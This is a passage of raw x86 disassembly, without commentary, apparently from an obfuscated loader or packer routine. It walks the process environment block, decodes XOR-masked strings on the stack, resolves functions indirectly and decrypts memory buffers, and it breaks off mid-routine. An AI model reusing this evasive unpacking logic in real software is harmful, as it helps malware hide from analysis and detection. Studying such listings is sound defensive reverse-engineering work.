  42550e:	dec    DWORD PTR [ebp-0x28]
  425511:	jne    0x4254e5
  425513:	mov    DWORD PTR [ebp-0x28],0x400e
  42551a:	mov    eax,DWORD PTR [ebp-0x10]
  42551d:	xor    eax,ebx
  42551f:	mov    esi,0x3272ec
  425524:	add    eax,esi
  425526:	mov    DWORD PTR [ebp-0x1c],eax
  425529:	mov    eax,DWORD PTR [ebp-0x10]
  42552c:	and    DWORD PTR [ebp-0x94],0x0
  425533:	xor    eax,ebx
  425535:	add    eax,esi
  425537:	mov    DWORD PTR [ebp-0x34],eax
  42553a:	mov    eax,fs:0x18
  425540:	mov    DWORD PTR [ebp-0x94],eax
  425546:	mov    eax,DWORD PTR [eax+0x30]
  425549:	mov    DWORD PTR [ebp-0xcc],eax
  42554f:	mov    eax,DWORD PTR [eax+0xc]
  425552:	mov    DWORD PTR [ebp-0xc0],eax
  425558:	mov    eax,DWORD PTR [ebp+0x8]
  42555b:	lea    ecx,[ebp-0x94]
  425561:	mov    DWORD PTR [eax+0x1a0],ecx
  425567:	mov    eax,DWORD PTR [ebp+0x8]
  42556a:	lea    ecx,[ebp-0xcc]
  425570:	mov    DWORD PTR [eax+0x1a4],ecx
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	push   DWORD PTR [ebp+0x8]
  42557c:	lea    ecx,[ebp-0xc0]
  425582:	mov    DWORD PTR [eax+0x1a8],ecx
  425588:	call   0x427986
  42558d:	mov    ecx,DWORD PTR [ebp-0x10]
  425590:	xor    ecx,ebx
  425592:	add    ecx,esi
  425594:	cmp    ecx,eax
  425596:	je     0x425919
  42559c:	mov    eax,DWORD PTR [ebp+0x8]
  42559f:	mov    eax,DWORD PTR [eax+0x194]
  4255a5:	mov    ecx,DWORD PTR [eax]
  4255a7:	mov    eax,DWORD PTR [ebp+0x8]
  4255aa:	mov    eax,DWORD PTR [eax+0x194]
  4255b0:	mov    eax,DWORD PTR [eax]
  4255b2:	add    eax,DWORD PTR [ecx+0x3c]
  4255b5:	mov    ecx,DWORD PTR [ebp+0x8]
  4255b8:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4255be:	lea    edx,[ebp-0xec]
  4255c4:	push   edx
  4255c5:	mov    edx,DWORD PTR [ebp+0x8]
  4255c8:	mov    edx,DWORD PTR [edx+0x18c]
  4255ce:	mov    edx,DWORD PTR [edx]
  4255d0:	add    edx,DWORD PTR [eax+0x88]
  4255d6:	push   0x4
  4255d8:	push   DWORD PTR [eax+0x8c]
  4255de:	push   edx
  4255df:	call   DWORD PTR [ecx+0x1c]
  4255e2:	push   DWORD PTR [ebp+0x8]
  4255e5:	xor    eax,eax
  4255e7:	mov    DWORD PTR [ebp-0xa8],0x123f0f35
  4255f1:	mov    DWORD PTR [ebp-0xa4],0xb360c1d
  4255fb:	mov    DWORD PTR [ebp-0xa0],0x3d0c1103
  425605:	mov    BYTE PTR [ebp-0x9c],0x7a
  42560c:	lea    edi,[ebp-0x9b]
  425612:	stos   DWORD PTR es:[edi],eax
  425613:	stos   WORD PTR es:[edi],ax
  425615:	stos   BYTE PTR es:[edi],al
  425616:	xor    eax,eax
  425618:	mov    DWORD PTR [ebp-0xbc],0x123f0f35
  425622:	mov    DWORD PTR [ebp-0xb8],0xb360c1d
  42562c:	mov    DWORD PTR [ebp-0xb4],0x230c1103
  425636:	mov    BYTE PTR [ebp-0xb0],0x7a
  42563d:	lea    edi,[ebp-0xaf]
  425643:	stos   DWORD PTR es:[edi],eax
  425644:	stos   WORD PTR es:[edi],ax
  425646:	stos   BYTE PTR es:[edi],al
  425647:	mov    edi,DWORD PTR [ebp+0x8]
  42564a:	mov    eax,DWORD PTR [ebp+0x8]
  42564d:	mov    edx,DWORD PTR [eax+0x1b8]
  425653:	mov    DWORD PTR [ebp-0x68],0xc0e0f16
  42565a:	mov    DWORD PTR [ebp-0x64],0x150a091f
  425661:	mov    WORD PTR [ebp-0x60],0x7a3d
  425667:	mov    DWORD PTR [ebp-0x90],0x123f0f35
  425671:	mov    DWORD PTR [ebp-0x8c],0x163d0c1d
  42567b:	mov    DWORD PTR [ebp-0x88],0x281d120a
  425685:	mov    DWORD PTR [ebp-0x84],0xc110901
  42568f:	mov    DWORD PTR [ebp-0x80],0x7a3d1f15
  425696:	mov    DWORD PTR [ebp-0x7c],0x123f0f35
  42569d:	mov    DWORD PTR [ebp-0x78],0x163d0c1d
  4256a4:	mov    DWORD PTR [ebp-0x74],0x281d120a
  4256ab:	mov    DWORD PTR [ebp-0x70],0xc110901
  4256b2:	mov    DWORD PTR [ebp-0x6c],0x7a231f15
  4256b9:	call   0x4279b5
  4256be:	push   eax
  4256bf:	mov    eax,DWORD PTR [ebp+0x8]
  4256c2:	mov    eax,DWORD PTR [eax+0x1a8]
  4256c8:	push   DWORD PTR [eax]
  4256ca:	call   0x427656
  4256cf:	test   eax,eax
  4256d1:	jne    0x425723
  4256d3:	mov    eax,DWORD PTR [ebp+0x8]
  4256d6:	mov    eax,DWORD PTR [eax+0x1d8]
  4256dc:	mov    edi,DWORD PTR [ebp+0x8]
  4256df:	add    eax,0x4
  4256e2:	mov    DWORD PTR [ebp-0x24],eax
  4256e5:	mov    eax,DWORD PTR [ebp+0x8]
  4256e8:	mov    edx,DWORD PTR [eax+0x1b8]
  4256ee:	call   0x4279b5
  4256f3:	push   eax
  4256f4:	mov    eax,DWORD PTR [ebp-0x24]
  4256f7:	call   DWORD PTR [eax]
  4256f9:	test   eax,eax
  4256fb:	jne    0x425723
  4256fd:	mov    eax,DWORD PTR [ebp+0x8]
  425700:	mov    eax,DWORD PTR [eax+0x1d8]
  425706:	mov    edi,DWORD PTR [ebp+0x8]
  425709:	add    eax,0x10
  42570c:	mov    DWORD PTR [ebp-0x24],eax
  42570f:	mov    eax,DWORD PTR [ebp+0x8]
  425712:	mov    edx,DWORD PTR [eax+0x1b8]
  425718:	call   0x4279b5
  42571d:	push   eax
  42571e:	mov    eax,DWORD PTR [ebp-0x24]
  425721:	call   DWORD PTR [eax]
  425723:	mov    eax,DWORD PTR [ebp-0x10]
  425726:	mov    ecx,DWORD PTR [ebp-0x28]
  425729:	xor    eax,ebx
  42572b:	add    eax,esi
  42572d:	cmp    eax,ecx
  42572f:	je     0x4258f2
  425735:	mov    eax,DWORD PTR [ebp-0x18]
  425738:	xor    eax,ebx
  42573a:	mov    ecx,0xffcd8d14
  42573f:	sub    ecx,eax
  425741:	add    ecx,DWORD PTR [ebp-0x28]
  425744:	mov    eax,DWORD PTR [ebp-0x1c]
  425747:	cmp    eax,ecx
  425749:	ja     0x4258f2
  42574f:	mov    DWORD PTR [ebp-0x20],0x0
  425756:	push   DWORD PTR [ebp+0x8]
  425759:	mov    edi,DWORD PTR [ebp+0x8]
  42575c:	mov    eax,DWORD PTR [ebp+0x8]
  42575f:	mov    edx,DWORD PTR [eax+0x1b4]
  425765:	call   0x4279b5
  42576a:	push   eax
  42576b:	mov    eax,DWORD PTR [ebp+0x8]
  42576e:	mov    eax,DWORD PTR [eax+0x1a8]
  425774:	push   DWORD PTR [eax]
  425776:	call   0x427656
  42577b:	mov    ecx,DWORD PTR [ebp+0x8]
  42577e:	mov    ecx,DWORD PTR [ecx+0x19c]
  425784:	mov    DWORD PTR [ecx],eax
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	mov    edi,DWORD PTR [eax+0x1d8]
  42578f:	mov    esi,DWORD PTR [ebp+0x8]
  425792:	xor    eax,eax
  425794:	lea    edx,[ebp-0x7c]
  425797:	call   0x4279eb
  42579c:	push   eax
  42579d:	mov    eax,DWORD PTR [ebp+0x8]
  4257a0:	mov    eax,DWORD PTR [eax+0x19c]
  4257a6:	push   DWORD PTR [eax]
  4257a8:	call   DWORD PTR [edi+0x8]
  4257ab:	mov    DWORD PTR [ebp-0x24],eax
  4257ae:	mov    eax,DWORD PTR [ebp+0x8]
  4257b1:	mov    edi,DWORD PTR [eax+0x1d8]
  4257b7:	mov    esi,DWORD PTR [ebp+0x8]
  4257ba:	xor    eax,eax
  4257bc:	lea    edx,[ebp-0x90]
  4257c2:	call   0x4279eb
  4257c7:	push   eax
  4257c8:	mov    eax,DWORD PTR [ebp+0x8]
  4257cb:	mov    eax,DWORD PTR [eax+0x19c]
  4257d1:	push   DWORD PTR [eax]
  4257d3:	call   DWORD PTR [edi+0x8]
  4257d6:	mov    eax,DWORD PTR [ebp+0x8]
  4257d9:	mov    edi,DWORD PTR [eax+0x1d8]
  4257df:	mov    esi,DWORD PTR [ebp+0x8]
  4257e2:	xor    eax,eax
  4257e4:	lea    edx,[ebp-0xa8]
  4257ea:	call   0x4279eb
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ebp+0x8]
  4257f3:	mov    eax,DWORD PTR [eax+0x19c]
  4257f9:	push   DWORD PTR [eax]
  4257fb:	call   DWORD PTR [edi+0x8]
  4257fe:	and    DWORD PTR [ebp-0x8],0x0
  425802:	mov    DWORD PTR [ebp-0x44],eax
  425805:	mov    eax,DWORD PTR [ebp-0x8]
  425808:	and    eax,0x7
  42580b:	add    eax,0x31
  42580e:	push   eax
  42580f:	call   DWORD PTR [ebp-0x24]
  425812:	test   eax,eax
  425814:	je     0x425858
  425816:	mov    eax,DWORD PTR [ebp-0x8]
  425819:	push   0x19
  42581b:	xor    edx,edx
  42581d:	pop    ecx
  42581e:	div    ecx
  425820:	add    dl,0x41
  425823:	movzx  eax,dl
  425826:	push   eax
  425827:	call   DWORD PTR [ebp-0x44]
  42582a:	test   eax,eax
  42582c:	jne    0x425858
  42582e:	mov    eax,DWORD PTR [ebp+0x8]
  425831:	mov    edi,DWORD PTR [eax+0x1d8]
  425837:	mov    esi,DWORD PTR [ebp+0x8]
  42583a:	xor    eax,eax
  42583c:	lea    edx,[ebp-0x68]
  42583f:	call   0x4279eb
  425844:	push   eax
  425845:	mov    eax,DWORD PTR [ebp+0x8]
  425848:	mov    eax,DWORD PTR [eax+0x198]
  42584e:	push   DWORD PTR [eax]
  425850:	call   DWORD PTR [edi+0x8]
  425853:	mov    DWORD PTR [ebp-0x14],eax
  425856:	jmp    0x42585c
  425858:	and    DWORD PTR [ebp-0x14],0x0
  42585c:	inc    DWORD PTR [ebp-0x8]
  42585f:	cmp    DWORD PTR [ebp-0x8],0x10
  425863:	jb     0x425805
  425865:	mov    eax,DWORD PTR [ebp-0x18]
  425868:	mov    esi,DWORD PTR [ebp+0x8]
  42586b:	xor    eax,ebx
  42586d:	mov    edi,0x3272ec
  425872:	add    eax,edi
  425874:	lea    edx,[ebp-0x10c]
  42587a:	call   0x4279eb
  42587f:	push   eax
  425880:	mov    eax,DWORD PTR [ebp-0x10]
  425883:	mov    esi,DWORD PTR [ebp+0x8]
  425886:	xor    eax,ebx
  425888:	add    eax,edi
  42588a:	lea    edx,[ebp-0x12c]
  425890:	call   0x4279eb
  425895:	push   eax
  425896:	call   DWORD PTR [ebp-0x14]
  425899:	mov    ecx,DWORD PTR [ebp-0x10]
  42589c:	xor    ecx,ebx
  42589e:	add    ecx,edi
  4258a0:	cmp    ecx,eax
  4258a2:	jne    0x4258ab
  4258a4:	mov    DWORD PTR [ebp-0x20],0x1
  4258ab:	mov    eax,DWORD PTR [ebp-0x18]
  4258ae:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258b1:	xor    eax,ebx
  4258b3:	lea    eax,[eax+ecx*1+0x3272ec]
  4258ba:	mov    DWORD PTR [ebp-0x1c],eax
  4258bd:	mov    eax,DWORD PTR [ebp-0x20]
  4258c0:	test   eax,eax
  4258c2:	je     0x4258d6
  4258c4:	mov    eax,DWORD PTR [ebp-0x18]
  4258c7:	mov    ecx,DWORD PTR [ebp-0x34]
  4258ca:	xor    eax,ebx
  4258cc:	lea    eax,[eax+ecx*1+0x3272ec]
  4258d3:	mov    DWORD PTR [ebp-0x34],eax
  4258d6:	mov    eax,DWORD PTR [ebp-0x18]
  4258d9:	xor    eax,ebx
  4258db:	mov    ecx,0xffcd8d14
  4258e0:	sub    ecx,eax
  4258e2:	add    ecx,DWORD PTR [ebp-0x28]
  4258e5:	mov    eax,DWORD PTR [ebp-0x1c]
  4258e8:	cmp    eax,ecx
  4258ea:	jbe    0x42574f
  4258f0:	mov    esi,edi
  4258f2:	mov    eax,DWORD PTR [ebp-0x34]
  4258f5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258f8:	cmp    ecx,eax
  4258fa:	jne    0x42590d
  4258fc:	push   DWORD PTR [ebp+0x8]
  4258ff:	lea    eax,[ebp-0x3c]
  425902:	push   eax
  425903:	call   0x42845b
  425908:	mov    DWORD PTR [ebp-0x2c],eax
  42590b:	jmp    0x425919
  42590d:	mov    eax,DWORD PTR [ebp-0x2c]
  425910:	mov    ecx,DWORD PTR [ebp-0x18]
  425913:	xor    ecx,ebx
  425915:	add    ecx,esi
  425917:	xor    DWORD PTR [eax],ecx
  425919:	mov    eax,DWORD PTR [ebp-0x10]
  42591c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42591f:	xor    eax,ebx
  425921:	add    eax,esi
  425923:	cmp    eax,ecx
  425925:	je     0x42609f
  42592b:	mov    eax,DWORD PTR [ebp-0x10]
  42592e:	mov    ecx,DWORD PTR [ebp-0x3c]
  425931:	xor    eax,ebx
  425933:	add    eax,esi
  425935:	cmp    eax,ecx
  425937:	je     0x42609f
  42593d:	mov    eax,DWORD PTR [ebp-0x10]
  425940:	xor    eax,ebx
  425942:	add    eax,esi
  425944:	jmp    0x425962
  425946:	mov    edi,DWORD PTR [ebp-0x2c]
  425949:	mov    cl,al
  42594b:	and    cl,0x1f
  42594e:	or     dl,0xff
  425951:	sub    dl,cl
  425953:	add    BYTE PTR [edi+eax*1],dl
  425956:	mov    ecx,DWORD PTR [ebp-0x18]
  425959:	xor    ecx,ebx
  42595b:	lea    eax,[eax+ecx*1+0x3272ec]
  425962:	mov    ecx,DWORD PTR [ebp-0x3c]
  425965:	cmp    eax,ecx
  425967:	jb     0x425946
  425969:	mov    eax,DWORD PTR [ebp-0x3c]
  42596c:	mov    DWORD PTR [ebp-0x28],eax
  42596f:	mov    eax,DWORD PTR [ebp-0x2c]
  425972:	mov    DWORD PTR [ebp-0x34],0xf89c85b0
  425979:	mov    DWORD PTR [ebp-0xd4],eax
  42597f:	mov    edi,0xf89c85b1
  425984:	mov    DWORD PTR [ebp-0x30],edi
  425987:	mov    eax,DWORD PTR [ebp-0x34]
  42598a:	xor    eax,ebx
  42598c:	add    eax,esi
  42598e:	mov    DWORD PTR [ebp-0xc],eax
  425991:	mov    eax,DWORD PTR [ebp-0x34]
  425994:	xor    eax,ebx
  425996:	add    eax,esi
  425998:	mov    DWORD PTR [ebp-0x8],eax
  42599b:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  4259a2:	mov    DWORD PTR [ebp-0x4c],0xf89c85bf
  4259a9:	mov    eax,DWORD PTR [ebp-0x34]
  4259ac:	mov    ecx,DWORD PTR [ebp-0x28]
  4259af:	xor    eax,ebx
  4259b1:	add    eax,esi
  4259b3:	cmp    ecx,eax
  4259b5:	je     0x425bb4
  4259bb:	jmp    0x425b90
  4259c0:	mov    ecx,DWORD PTR [ebp-0xc]
  4259c3:	mov    eax,DWORD PTR [ebp-0x28]
  4259c6:	sub    eax,ecx
  4259c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4259cb:	xor    ecx,ebx
  4259cd:	add    ecx,esi
  4259cf:	xor    edx,edx
  4259d1:	div    ecx
  4259d3:	mov    DWORD PTR [ebp-0x8],eax
  4259d6:	mov    eax,DWORD PTR [ebp-0x4c]
  4259d9:	mov    ecx,DWORD PTR [ebp-0x8]
  4259dc:	xor    eax,ebx
  4259de:	add    eax,esi
  4259e0:	cmp    ecx,eax
  4259e2:	jbe    0x4259ee
  4259e4:	mov    eax,DWORD PTR [ebp-0x4c]
  4259e7:	xor    eax,ebx
  4259e9:	add    eax,esi
  4259eb:	mov    DWORD PTR [ebp-0x8],eax
  4259ee:	mov    eax,DWORD PTR [ebp-0x44]
  4259f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4259f4:	xor    eax,ebx
  4259f6:	add    eax,esi
  4259f8:	imul   eax,ecx
  4259fb:	mov    DWORD PTR [ebp-0x8],eax
  4259fe:	mov    eax,DWORD PTR [ebp-0x34]
  425a01:	mov    ecx,DWORD PTR [ebp-0x8]
  425a04:	xor    eax,ebx
  425a06:	add    eax,esi
  425a08:	cmp    ecx,eax
  425a0a:	je     0x425b7e
  425a10:	mov    eax,DWORD PTR [ebp-0x8]
  425a13:	mov    DWORD PTR [ebp-0x14],eax
  425a16:	mov    eax,DWORD PTR [ebp-0xc]
  425a19:	add    eax,DWORD PTR [ebp-0xd4]
  425a1f:	mov    DWORD PTR [ebp-0x24],0xf89c85b0
  425a26:	mov    DWORD PTR [ebp-0x20],edi
  425a29:	mov    DWORD PTR [ebp-0xe8],0xf89c85b2
  425a33:	mov    DWORD PTR [ebp-0x8],eax
  425a36:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425a3d:	mov    DWORD PTR [ebp-0x1c],edi
  425a40:	mov    eax,DWORD PTR [ebp-0x24]
  425a43:	xor    eax,ebx
  425a45:	add    eax,esi
  425a47:	jmp    0x425b3d
  425a4c:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  425a56:	mov    DWORD PTR [ebp-0xc4],0xf89c858e
  425a60:	mov    eax,DWORD PTR [ebp-0x1c]
  425a63:	mov    ecx,DWORD PTR [ebp-0x48]
  425a66:	xor    eax,ebx
  425a68:	add    eax,esi
  425a6a:	imul   eax,ecx
  425a6d:	mov    ecx,DWORD PTR [ebp-0x8]
  425a70:	mov    al,BYTE PTR [eax+ecx*1]
  425a73:	mov    BYTE PTR [ebp-0x2],al
  425a76:	mov    eax,DWORD PTR [ebp-0x1c]
  425a79:	mov    ecx,DWORD PTR [ebp-0x48]
  425a7c:	xor    eax,ebx
  425a7e:	add    eax,esi
  425a80:	imul   eax,ecx
  425a83:	mov    ecx,DWORD PTR [ebp-0xe8]
  425a89:	xor    ecx,ebx
  425a8b:	add    eax,ecx
  425a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  425a90:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425a98:	mov    ecx,DWORD PTR [ebp-0xe0]
  425a9e:	xor    ecx,ebx
  425aa0:	lea    eax,[ecx+eax*1+0x3272ec]
  425aa7:	movzx  ecx,BYTE PTR [ebp-0x2]
  425aab:	xor    ecx,eax
  425aad:	mov    BYTE PTR [ebp-0x2],cl
  425ab0:	mov    al,BYTE PTR [ebp-0x2]
  425ab3:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ab6:	mov    edx,DWORD PTR [ebp-0x48]
  425ab9:	xor    ecx,ebx
  425abb:	add    ecx,esi
  425abd:	imul   ecx,edx
  425ac0:	mov    edx,DWORD PTR [ebp-0x8]
  425ac3:	mov    BYTE PTR [ecx+edx*1],al
  425ac6:	mov    eax,DWORD PTR [ebp-0x1c]
  425ac9:	mov    ecx,DWORD PTR [ebp-0x48]
  425acc:	xor    eax,ebx
  425ace:	add    eax,esi
  425ad0:	imul   eax,ecx
  425ad3:	mov    ecx,DWORD PTR [ebp-0x8]
  425ad6:	mov    al,BYTE PTR [eax+ecx*1]
  425ad9:	mov    BYTE PTR [ebp-0x2],al
  425adc:	mov    eax,DWORD PTR [ebp-0x1c]
  425adf:	mov    ecx,DWORD PTR [ebp-0x48]
  425ae2:	xor    eax,ebx
  425ae4:	add    eax,esi
  425ae6:	imul   eax,ecx
  425ae9:	mov    ecx,DWORD PTR [ebp-0x20]
  425aec:	xor    ecx,ebx
  425aee:	add    eax,ecx
  425af0:	mov    ecx,DWORD PTR [ebp-0x8]
  425af3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425afb:	mov    ecx,DWORD PTR [ebp-0xc4]
  425b01:	xor    ecx,ebx
  425b03:	lea    eax,[ecx+eax*1+0x3272ec]
  425b0a:	movzx  ecx,BYTE PTR [ebp-0x2]
  425b0e:	xor    ecx,eax
  425b10:	mov    BYTE PTR [ebp-0x2],cl
  425b13:	mov    al,BYTE PTR [ebp-0x2]
  425b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b19:	mov    edx,DWORD PTR [ebp-0x48]
  425b1c:	xor    ecx,ebx
  425b1e:	add    ecx,esi
  425b20:	imul   ecx,edx
  425b23:	mov    edx,DWORD PTR [ebp-0x8]
  425b26:	mov    BYTE PTR [ecx+edx*1],al
  425b29:	mov    eax,DWORD PTR [ebp-0x38]
  425b2c:	mov    ecx,DWORD PTR [ebp-0x20]
  425b2f:	xor    eax,ebx
  425b31:	xor    ecx,ebx
  425b33:	add    eax,esi
  425b35:	add    ecx,esi
  425b37:	imul   eax,ecx
  425b3a:	add    eax,DWORD PTR [ebp-0x48]
  425b3d:	mov    DWORD PTR [ebp-0x48],eax
  425b40:	mov    eax,DWORD PTR [ebp-0x48]
  425b43:	mov    ecx,DWORD PTR [ebp-0x14]
  425b46:	cmp    ecx,eax
  425b48:	jb     0x425a4c
  425b4e:	mov    eax,DWORD PTR [ebp-0x20]
  425b51:	mov    ecx,DWORD PTR [ebp-0x14]
  425b54:	xor    eax,ebx
  425b56:	add    eax,esi
  425b58:	imul   eax,ecx
  425b5b:	mov    ecx,DWORD PTR [ebp-0x24]
  425b5e:	xor    ecx,ebx
  425b60:	add    ecx,esi
  425b62:	or     eax,ecx
  425b64:	mov    ecx,DWORD PTR [ebp-0x30]
  425b67:	xor    ecx,ebx
  425b69:	add    eax,ecx
  425b6b:	mov    ecx,DWORD PTR [ebp-0x30]
  425b6e:	xor    ecx,ebx
  425b70:	add    eax,ecx
  425b72:	mov    ecx,DWORD PTR [ebp-0xc]
  425b75:	lea    eax,[eax+ecx*1+0x64e5d8]
  425b7c:	jmp    0x425b8d
  425b7e:	mov    eax,DWORD PTR [ebp-0x30]
  425b81:	mov    ecx,DWORD PTR [ebp-0xc]
  425b84:	xor    eax,ebx
  425b86:	lea    eax,[eax+ecx*1+0x3272ec]
  425b8d:	mov    DWORD PTR [ebp-0xc],eax
  425b90:	mov    eax,DWORD PTR [ebp-0x30]
  425b93:	xor    eax,ebx
  425b95:	mov    ecx,0xffcd8d14
  425b9a:	sub    ecx,eax
  425b9c:	add    ecx,DWORD PTR [ebp-0x28]
  425b9f:	mov    eax,DWORD PTR [ebp-0x30]
  425ba2:	mov    edx,DWORD PTR [ebp-0xc]
  425ba5:	xor    eax,ebx
  425ba7:	add    eax,esi
  425ba9:	imul   eax,edx
  425bac:	cmp    eax,ecx
  425bae:	jbe    0x4259c0
  425bb4:	mov    eax,DWORD PTR [ebp-0x10]
  425bb7:	mov    ecx,DWORD PTR [ebp-0x3c]
  425bba:	mov    eax,DWORD PTR [ebp+0x8]
  425bbd:	mov    edx,DWORD PTR [ebp-0x54]
  425bc0:	mov    eax,DWORD PTR [eax+0x1d8]
  425bc6:	xor    edx,ebx
  425bc8:	add    edx,esi
  425bca:	push   edx
  425bcb:	mov    edx,DWORD PTR [ebp-0x40]
  425bce:	xor    edx,ebx
  425bd0:	add    edx,esi
  425bd2:	push   edx
  425bd3:	push   ecx
  425bd4:	mov    DWORD PTR [ebp-0x38],ecx
  425bd7:	mov    ecx,DWORD PTR [ebp-0x10]
  425bda:	xor    ecx,ebx
  425bdc:	add    ecx,esi
  425bde:	push   ecx
  425bdf:	call   DWORD PTR [eax+0x14]
  425be2:	mov    edi,eax
  425be4:	mov    eax,DWORD PTR [ebp-0x10]
  425be7:	xor    eax,ebx
  425be9:	add    eax,esi
  425beb:	cmp    eax,edi
  425bed:	je     0x425c48
  425bef:	mov    eax,DWORD PTR [ebp-0x10]
  425bf2:	jmp    0x425c15
  425bf4:	mov    ecx,DWORD PTR [ebp-0x2c]
  425bf7:	xor    eax,ebx
  425bf9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ec]
  425c00:	mov    BYTE PTR [eax+edi*1+0x3272ec],cl
  425c07:	mov    ecx,DWORD PTR [ebp-0x18]
  425c0a:	xor    ecx,ebx
  425c0c:	lea    eax,[ecx+eax*1+0x3272ec]
  425c13:	xor    eax,ebx
  425c15:	mov    ecx,DWORD PTR [ebp-0x3c]
  425c18:	sub    ecx,esi
  425c1a:	xor    ecx,ebx
  425c1c:	cmp    eax,ecx
  425c1e:	jne    0x425bf4
  425c20:	mov    eax,DWORD PTR [ebp+0x8]
  425c23:	mov    ecx,DWORD PTR [ebp-0x50]
  425c26:	mov    eax,DWORD PTR [eax+0x1d8]
  425c2c:	xor    ecx,ebx
  425c2e:	add    ecx,esi
  425c30:	push   ecx
  425c31:	mov    ecx,DWORD PTR [ebp-0x10]
  425c34:	xor    ecx,ebx
  425c36:	add    ecx,esi
  425c38:	push   ecx
  425c39:	push   DWORD PTR [ebp-0x2c]
  425c3c:	call   DWORD PTR [eax+0x18]
  425c3f:	mov    eax,DWORD PTR [ebp-0x38]
  425c42:	mov    DWORD PTR [ebp-0x2c],edi
  425c45:	mov    DWORD PTR [ebp-0x3c],eax
  425c48:	mov    eax,DWORD PTR [ebp-0x2c]
  425c4b:	mov    DWORD PTR [ebp-0x14],eax
  425c4e:	mov    eax,DWORD PTR [ebp-0x18]
  425c51:	mov    ecx,DWORD PTR [ebp-0x10]
  425c54:	xor    eax,ebx
  425c56:	add    eax,esi
  425c58:	mov    DWORD PTR [ebp-0x5c],0x3d222a22
  425c5f:	mov    DWORD PTR [ebp-0x58],0x37223f22
  425c66:	jmp    0x425c99
  425c68:	mov    edx,DWORD PTR [ebp-0x14]
  425c6b:	mov    edi,ecx
  425c6d:	xor    edi,ebx
  425c6f:	mov    cl,BYTE PTR [ebp+edi*1+0x327290]
  425c76:	movsx  edx,BYTE PTR [edi+edx*1+0x3272ec]
  425c7e:	xor    cl,0x79
  425c81:	sub    cl,0x3
  425c84:	movzx  ecx,cl
  425c87:	cmp    edx,ecx
  425c89:	jne    0x425ca3
  425c8b:	mov    ecx,DWORD PTR [ebp-0x18]
  425c8e:	xor    ecx,ebx
  425c90:	lea    ecx,[ecx+edi*1+0x3272ec]
  425c97:	xor    ecx,ebx
  425c99:	cmp    ecx,0xf89c85b8
  425c9f:	jne    0x425c68
  425ca1:	jmp    0x425caa
  425ca3:	mov    eax,DWORD PTR [ebp-0x10]
  425ca6:	xor    eax,ebx
  425ca8:	add    eax,esi
  425caa:	mov    ecx,DWORD PTR [ebp-0x10]
  425cad:	xor    ecx,ebx
  425caf:	add    ecx,esi
  425cb1:	cmp    ecx,eax
  425cb3:	je     0x425e29
  425cb9:	mov    eax,DWORD PTR [ebp-0x14]
  425cbc:	mov    eax,DWORD PTR [eax+0x8]
  425cbf:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  425cc6:	mov    DWORD PTR [ebp-0x40],0xf89cc327
  425ccd:	mov    DWORD PTR [ebp-0x44],0xf89cb5b0
  425cd4:	mov    DWORD PTR [ebp-0x24],0xf89c85bc
  425cdb:	mov    DWORD PTR [ebp-0x20],eax
  425cde:	mov    eax,DWORD PTR [ebp+0x8]
  425ce1:	mov    ecx,DWORD PTR [ebp-0x24]
  425ce4:	xor    ecx,ebx
  425ce6:	add    ecx,esi
  425ce8:	push   ecx
  425ce9:	mov    ecx,DWORD PTR [ebp-0x44]
  425cec:	mov    eax,DWORD PTR [eax+0x1d8]
  425cf2:	xor    ecx,ebx
  425cf4:	add    ecx,esi
  425cf6:	push   ecx
  425cf7:	mov    ecx,DWORD PTR [ebp-0x40]
  425cfa:	xor    ecx,ebx
  425cfc:	add    ecx,esi
  425cfe:	push   ecx
  425cff:	mov    ecx,DWORD PTR [ebp-0xc]
  425d02:	xor    ecx,ebx
  425d04:	add    ecx,esi
  425d06:	push   ecx
  425d07:	call   DWORD PTR [eax+0x14]
  425d0a:	mov    edi,eax
  425d0c:	mov    eax,DWORD PTR [ebp+0x8]
  425d0f:	mov    ecx,DWORD PTR [ebp-0x24]
  425d12:	mov    eax,DWORD PTR [eax+0x1d8]
  425d18:	xor    ecx,ebx
  425d1a:	add    ecx,esi
  425d1c:	push   ecx
  425d1d:	mov    ecx,DWORD PTR [ebp-0x44]
  425d20:	xor    ecx,ebx
  425d22:	add    ecx,esi
  425d24:	push   ecx
  425d25:	mov    ecx,DWORD PTR [ebp-0xc]
  425d28:	push   DWORD PTR [ebp-0x20]
  425d2b:	xor    ecx,ebx
  425d2d:	add    ecx,esi
  425d2f:	push   ecx
  425d30:	call   DWORD PTR [eax+0x14]
  425d33:	mov    ecx,DWORD PTR [ebp-0xc]
  425d36:	xor    ecx,ebx
  425d38:	add    ecx,esi
  425d3a:	mov    DWORD PTR [ebp-0x24],eax
  425d3d:	cmp    ecx,edi
  425d3f:	je     0x4260cc
  425d45:	mov    ecx,DWORD PTR [ebp-0xc]
  425d48:	xor    ecx,ebx
  425d4a:	add    ecx,esi
  425d4c:	cmp    ecx,eax
  425d4e:	je     0x4260cc
  425d54:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  425d5b:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  425d62:	mov    ecx,DWORD PTR [ebp-0x40]
  425d65:	xor    cl,0xa4
  425d68:	sub    cl,0x14
  425d6b:	mov    BYTE PTR [edi],cl
  425d6d:	mov    ecx,DWORD PTR [ebp-0xc]
  425d70:	xor    cl,0xa4
  425d73:	sub    cl,0x14
  425d76:	mov    BYTE PTR [edi+0x1],cl
  425d79:	mov    ecx,DWORD PTR [ebp-0x54]
  425d7c:	xor    cl,0xa4
  425d7f:	sub    cl,0x14
  425d82:	mov    BYTE PTR [edi+0x2],cl
  425d85:	and    DWORD PTR [ebp-0xc8],0x0
  425d8c:	and    DWORD PTR [ebp-0xdc],0x0
